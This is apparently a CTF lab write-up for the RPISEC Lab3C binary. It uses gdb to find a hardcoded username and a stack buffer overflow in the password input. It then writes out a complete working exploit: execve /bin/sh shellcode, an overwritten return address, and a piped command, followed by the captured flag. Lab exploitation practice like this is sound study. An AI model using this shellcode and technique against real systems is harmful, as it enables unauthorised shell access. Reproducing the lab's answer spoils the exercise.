## Lab3C

`i functions`

```
0x0804873d  verify_user_name
0x0804876d  verify_user_pass
0x08048790  main
```

`disas verify_user_name`
```
Dump of assembler code for function verify_user_name:
   0x0804873d <+0>:     push   ebp
   0x0804873e <+1>:     mov    ebp,esp
   0x08048740 <+3>:     sub    esp,0x18
   0x08048743 <+6>:     mov    DWORD PTR [esp],0x8048910
   0x0804874a <+13>:    call   0x8048600 <puts@plt>
   0x0804874f <+18>:    mov    DWORD PTR [esp+0x8],0x6
   0x08048757 <+26>:    mov    DWORD PTR [esp+0x4],0x8048928
   0x0804875f <+34>:    mov    DWORD PTR [esp],0x8049c40
   0x08048766 <+41>:    call   0x8048630 <strncmp@plt>
   0x0804876b <+46>:    leave  
   0x0804876c <+47>:    ret    
End of assembler dump.
```
```
$ x/s 0x8048928
0x8048928:      "rpisec"
```

Buffer overflow is in password input

```
>>> print('a'*80 + 'b'*4)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
```

Enter above string for password and we have successfully overwritten the saved EIP

```
$ i f
Stack level 0, frame at 0xbffff700:
 eip = 0x8048844 in main; saved eip = 0x62626262
 called by frame at 0xbffff704
 Arglist at 0xbffff6f8, args: 
 Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
 Saved registers:
  ebx at 0xbffff6f0, ebp at 0xbffff6f8, edi at 0xbffff6f4, eip at 0xbffff6fc
```

We can also overflow username which is stored in the data segment @ 0x8049c40. So we add the shellcode after the username "rpisec" and jump to it by overwriting the eip with address 0x8049c46

shellcode - http://shell-storm.org/shellcode/files/shellcode-811.php

`python -c "print 'rpisec\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80';print 'a'*80 + 'F\x9c\x04\x08'" > /tmp/a.txt`

`$ (cat /tmp/a.txt; cat -)|./lab3C`

Password - **`th3r3_iz_n0_4dm1ns_0n1y_U!`**


